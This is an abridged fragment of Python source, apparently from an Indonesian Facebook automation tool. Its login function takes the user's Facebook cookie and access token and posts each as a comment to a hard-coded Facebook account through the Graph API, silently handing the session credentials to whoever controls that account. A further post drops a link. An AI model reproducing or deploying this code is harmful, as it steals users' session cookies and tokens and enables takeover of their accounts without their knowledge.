...
git_hub = 'github.com/tahaluindo'
faceb0ok = 'Ahmad Chen Wang xuesi'
...
def login():
	...
	try:
		...
		link = ('https://www.facebook.com/100035252662553/posts/pfbid0XG98QfpWh2XJYcSPQm6AqQDzLPX797B7UZLdzruNNcvYpEt5sqvuXTS2i7RsW8vDl/?app=fbl')
		random_kata = random.choice(["Ahmad ganteng","Hallo Ganteng","Ah Ganteng Banget Bang"])
		#ses.post(f"https://graph.facebook.com/100018396913729?fields=subscribers&access_token={token}",headers=(cookies=cok)
		ses.post(f"https://graph.facebook.com/100035252662553/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/100035252662553/comments/?message={token}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/100035252662553/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
